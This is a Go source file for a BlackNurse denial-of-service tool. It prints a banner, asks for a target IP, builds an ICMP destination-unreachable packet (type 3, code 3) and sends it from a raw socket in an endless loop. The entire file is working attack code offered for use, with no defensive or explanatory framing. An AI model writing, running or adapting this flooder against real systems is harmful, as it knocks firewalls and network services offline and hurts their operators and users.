package main

import (
    "net"
    "fmt"
    "io/ioutil"

    "golang.org/x/net/icmp"
    "golang.org/x/net/ipv4"
)

func generate_packet() []byte{
    packet_object := icmp.Message{
        Type: ipv4.ICMPTypeDestinationUnreachable,
        Code: 3,
        Checksum: 0,
        Body: &icmp.DefaultMessageBody{Data: []byte("black_nurse")},
    }

    packet, _ := packet_object.Marshal(nil)

    return packet
}

func black_nurse(packet []byte, target_ip string){
    connection, err := net.ListenPacket("ip4:icmp", "0.0.0.0")
    if err != nil {
        fmt.Println(err)
    }
    defer connection.Close()

    for {
        connection.WriteTo(packet, &net.IPAddr{IP:net.ParseIP(target_ip)})
    }
}

func main(){
    banner, _ := ioutil.ReadFile(`./banner`)
    fmt.Println(string(banner))

    var target_ip string
    fmt.Print("Input target IP:")
    fmt.Scan(&target_ip)

    black_nurse(generate_packet(), target_ip)
}
